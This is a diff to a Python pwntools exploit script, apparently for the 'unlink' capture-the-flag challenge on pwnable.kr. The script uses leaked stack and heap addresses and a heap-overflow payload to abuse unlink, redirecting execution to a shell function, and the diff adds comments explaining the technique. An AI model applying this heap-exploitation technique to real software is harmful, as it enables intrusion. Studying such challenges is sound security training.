@@ -1,4 +1,8 @@
-from struct import pack
+# In this challenge we exploit a heap overflow in order to exploit the unlink function.
+# With it, we can write anything we like anywhere, but its double sided, so both locations have to be writeable.
+# We use the leaks we have to overwrite the stack. We change ESP, and make it point to the SHELL function.
+# When main returns, it jumps to SHELL, and we are can read the flag :) 
+
 from pwn import *
 from sys import argv
 
@@ -6,7 +10,6 @@ BINARY = "./unlink"
 SHELL = 0x080484eb
 
 overflow = None
-#context.log_level = 'DEBUG'
 
 def run(name):
     global overflow
@@ -26,11 +29,6 @@ def run(name):
 
 p = run(BINARY)
 
-# g = gdb.attach(p.pid, """
-# break unlink 
-# continue
-# """)
-
 data = p.recv().split('\n')
 
 stack_addr = data[0].split()[-1]
@@ -42,7 +40,7 @@ heap = int(heap_addr, 16)
 print stack, heap
 
 payload = ""
-payload += cyclic(overflow)
+payload += cyclic(overflow) #overflow size differs on pwnable.kr's server
 payload += p32(SHELL)
 payload += p32(stack - 28 - 4)
 payload += p32(heap + 4)
